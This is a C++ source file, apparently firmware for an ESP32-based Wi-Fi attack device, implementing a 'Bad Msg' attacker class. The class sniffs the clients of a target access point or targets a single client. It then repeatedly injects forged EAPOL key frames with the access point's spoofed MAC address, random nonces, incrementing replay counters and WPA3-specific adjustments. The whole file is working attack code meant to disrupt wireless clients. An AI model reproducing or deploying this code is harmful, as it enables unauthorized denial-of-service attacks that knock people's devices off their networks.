#include "BadMsgAttacker.h"
#include "App.h"
#include "ConfigManager.h"
#include "Logger.h"
#include <esp_wifi.h>
#include "Config.h" // For RawFrames

BadMsgAttacker::BadMsgAttacker() 
    : app_(nullptr), stationSniffer_(nullptr), isActive_(false), isAttackPending_(false),
      packetCounter_(0), lastPacketTime_(0), isSniffing_(false), currentClientIndex_(0) {}

void BadMsgAttacker::setup(App* app) {
    app_ = app;
    stationSniffer_ = &app->getStationSniffer();
}

void BadMsgAttacker::prepareAttack(AttackType type) {
    if (isActive_) stop();
    isAttackPending_ = true;
    currentConfig_.type = type;
}

bool BadMsgAttacker::start(const WifiNetworkInfo& targetAp) {
    if (isActive_ || !isAttackPending_ || currentConfig_.type != AttackType::TARGET_AP) return false;

    LOG(LogLevel::INFO, "BAD_MSG", "Starting TARGET_AP attack on %s", targetAp.ssid);
    currentConfig_.targetAp = targetAp;
    packetCounter_ = 0;
    isSniffing_ = true;
    currentClientIndex_ = 0;

    if (!stationSniffer_->start(targetAp)) {
        LOG(LogLevel::ERROR, "BAD_MSG", "Failed to start station sniffer.");
        return false;
    }

    isActive_ = true;
    isAttackPending_ = false;
    return true;
}

bool BadMsgAttacker::start(const StationInfo& targetClient) {
    if (isActive_ || !isAttackPending_ || currentConfig_.type != AttackType::PINPOINT_CLIENT) return false;

    currentConfig_.targetClient = targetClient;
    currentConfig_.targetAp.channel = targetClient.channel;
    memcpy(currentConfig_.targetAp.bssid, targetClient.ap_bssid, 6);

    // find the AP in the scan list to get its security type
    bool ap_info_found = false;
    for (const auto& net : app_->getWifiManager().getScannedNetworks()) {
        if (memcmp(net.bssid, targetClient.ap_bssid, 6) == 0) {
            currentConfig_.targetAp.securityType = net.securityType;
            ap_info_found = true;
            break;
        }
    }
    if (!ap_info_found) {
        LOG(LogLevel::WARN, "BAD_MSG", "Could not find AP in scan results. Assuming WPA2.");
        currentConfig_.targetAp.securityType = WIFI_AUTH_WPA2_PSK; // Fallback
    }

    rfLock_ = app_->getHardwareManager().requestRfControl(RfClient::WIFI_PROMISCUOUS);
    if (!rfLock_ || !rfLock_->isValid()) {
        LOG(LogLevel::ERROR, "BAD_MSG", "Failed to acquire RF lock for pinpoint attack.");
        return false;
    }
    
    isActive_ = true;
    isAttackPending_ = false;
    packetCounter_ = 0;
    return true;
}

void BadMsgAttacker::stop() {
    if (!isActive_) return;
    LOG(LogLevel::INFO, "BAD_MSG", "Stopping Bad Msg attack.");
    isActive_ = false;
    isAttackPending_ = false;
    
    if (stationSniffer_->isActive()) {
        stationSniffer_->stop();
    }
    rfLock_.reset(); // This handles releasing the hardware.
}

void BadMsgAttacker::loop() {
    if (!isActive_) return;

    if (millis() - lastPacketTime_ < 200) { // Send a burst every 200ms
        return;
    }
    lastPacketTime_ = millis();

    if (currentConfig_.type == AttackType::PINPOINT_CLIENT) {
        sendBadMsgPacket(currentConfig_.targetClient, currentConfig_.targetAp.securityType);
    } else if (currentConfig_.type == AttackType::TARGET_AP) {
        const auto& clients = stationSniffer_->getFoundStations();
        if (clients.empty()) {
            isSniffing_ = true;
            return;
        }
        isSniffing_ = false;
        
        // Attack one client from the list per loop iteration to cycle through them
        if (currentClientIndex_ >= (int)clients.size()) {
            currentClientIndex_ = 0;
        }
        
        sendBadMsgPacket(clients[currentClientIndex_], currentConfig_.targetAp.securityType);       
        currentClientIndex_++;
    }
}

void BadMsgAttacker::sendBadMsgPacket(const StationInfo& client, uint8_t securityType) {
    esp_wifi_set_channel(client.channel, WIFI_SECOND_CHAN_NONE);
    delay(1);

    uint8_t packet[sizeof(RawFrames::Mgmt::BadMsg::EAPOL_TEMPLATE)];
    memcpy(packet, RawFrames::Mgmt::BadMsg::EAPOL_TEMPLATE, sizeof(packet));
    size_t frame_size = sizeof(packet);

    // Set MAC Addresses
    memcpy(&packet[4], client.mac, 6);      // Destination: The client
    memcpy(&packet[10], client.ap_bssid, 6); // Source: The AP
    memcpy(&packet[16], client.ap_bssid, 6); // BSSID: The AP

    // Randomize Nonce (bytes 49-80)
    esp_fill_random(&packet[49], 32);

    // Update Replay Counter
    for (uint8_t i = 0; i < 8; i++) {
        packet[41 + i] = (packetCounter_ >> (56 - i * 8)) & 0xFF;
    }

    // These enum values are from the ESP-IDF framework
    if (securityType == WIFI_AUTH_WPA3_PSK || securityType == WIFI_AUTH_WPA2_WPA3_PSK || securityType == WIFI_AUTH_WPA3_ENT_192) {
        LOG(LogLevel::DEBUG, "BAD_MSG", false, "Target is WPA3. Adjusting EAPOL frame.");
        packet[35] = 0x5f;  // Length: 95 bytes (instead of 117)
        packet[38] = 0xCB;  // Key-Info (LSB): Install|Ack|Pairwise, ver=3 (for GCMP)
        packet[39] = 0x00;  // Key Length MSB (must be 0 for GCMP)
        packet[40] = 0x00;  // Key Length LSB (must be 0 for GCMP)
        frame_size -= 22;   // The packet is 22 bytes shorter as it does not contain the PMKID
    }
    
    esp_wifi_80211_tx(WIFI_IF_AP, packet, frame_size, false);
    packetCounter_++;
}

// Getters
bool BadMsgAttacker::isActive() const { return isActive_; }
const BadMsgAttacker::AttackConfig& BadMsgAttacker::getConfig() const { return currentConfig_; }
uint32_t BadMsgAttacker::getPacketCount() const { return packetCounter_; }
int BadMsgAttacker::getClientCount() const {
    return (currentConfig_.type == AttackType::PINPOINT_CLIENT) ? 1 : stationSniffer_->getFoundStations().size();
}
bool BadMsgAttacker::isSniffing() const { return isSniffing_; }
